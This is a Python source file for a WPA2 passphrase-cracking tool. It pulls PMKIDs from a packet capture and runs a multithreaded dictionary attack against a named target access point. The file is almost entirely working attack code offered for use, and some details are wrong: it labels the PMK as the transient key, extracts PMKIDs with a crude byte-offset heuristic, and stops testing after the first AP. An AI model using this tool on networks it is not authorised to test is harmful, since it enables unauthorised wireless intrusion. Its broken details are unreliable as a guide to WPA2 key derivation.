import hmac
from hashlib import pbkdf2_hmac, sha1
import argparse
import threading
import concurrent.futures
import time
from tqdm import tqdm
from scapy.all import rdpcap, Dot11, EAPOL


def calculate_pmkid(pmk, ap_mac, sta_mac):
    """
    Calculates the PMKID with HMAC-SHA1[pmk + ("PMK Name" + bssid + clientmac)]
    128 bit PMKID will be matched with captured PMKID to check if passphrase is valid
    """
    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
    return pmkid


def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event, progress):
    """
    Finds the passphrase by computing pmk and passing into calculate_pmkid function.
    256 bit pmk calculation: passphrase + salt(ssid) => PBKDF2(HMAC-SHA1) of 4096 iterations
    """
    for pw in pw_list:
        if stop_event.is_set():
            break
        password = pw.strip()
        pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
        if pmkid == captured_pmkid:
            print(f"\nKEY FOUND! [ {password} ]")
            print(f"Master Key: {pmk.hex()}")
            print(f"Transient Key: {pmk.hex()}")  # Assuming Transient Key is same as PMK
            print(f"EAPOL HMAC: {pmkid.hex()}")
            stop_event.set()
        progress.update(1)


def extract_pmkid(pcap_file):
    packets = rdpcap(pcap_file)
    pmkid_list = []

    for pkt in packets:
        if pkt.haslayer(Dot11):
            ap_mac = pkt.addr2  # AP MAC Address
            sta_mac = pkt.addr1  # STA MAC Address

            if pkt.haslayer(EAPOL):
                raw_data = bytes(pkt)
                if len(raw_data) >= 0x76:  # Checking for PMKID presence
                    pmkid = raw_data[-16:].hex()
                    pmkid_list.append((ap_mac, sta_mac, pmkid))

    if not pmkid_list:
        print("No PMKID found in the capture file.")
    else:
        for ap, sta, pmkid in pmkid_list:
            print(f"AP MAC: {ap} | STA MAC: {sta} | PMKID: {pmkid}")
    return pmkid_list


def main():
    parser = argparse.ArgumentParser(description='A tool to crack WPA2 passphrase using obtained PMKID without clients or de-authentication.')
    
    parser.add_argument("capture", help="Path to the capture file")
    parser.add_argument("-e", "--essid", help="SSID of Target AP", required=True)
    parser.add_argument("-P", "--wordlist", help="Dictionary wordlist to use", required=True)
    args = parser.parse_args()

    ssid = args.essid.encode()
    wordlist = args.wordlist

    pmkid_list = extract_pmkid(args.capture)

    if not pmkid_list:
        print("No PMKID could be extracted. Exiting...")
        return

    stop_event = threading.Event()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor, open(wordlist, "r", encoding='ISO-8859-1') as file:
        start = time.perf_counter()
        chunk_size = 100000
        futures = []

        total_lines = sum(1 for line in open(wordlist, "r", encoding='ISO-8859-1'))
        progress = tqdm(total=total_lines, desc="Cracking Progress")

        for ap_mac, sta_mac, pmkid in pmkid_list:
            bssid = bytes.fromhex(ap_mac.replace(":", ""))
            client = bytes.fromhex(sta_mac.replace(":", ""))
            pmkid = bytes.fromhex(pmkid)

            while True:
                pw_list = file.readlines(chunk_size)
                if not pw_list:
                    break

                if stop_event.is_set():
                    break

                future = executor.submit(find_pw_chunk, pw_list, ssid, bssid, client, pmkid, stop_event, progress)
                futures.append(future)

            for future in concurrent.futures.as_completed(futures):
                pass

        finish = time.perf_counter()
        progress.close()
        print(f'[+] Finished in {round(finish-start, 2)} second(s)')


if __name__ == "__main__":
    main()
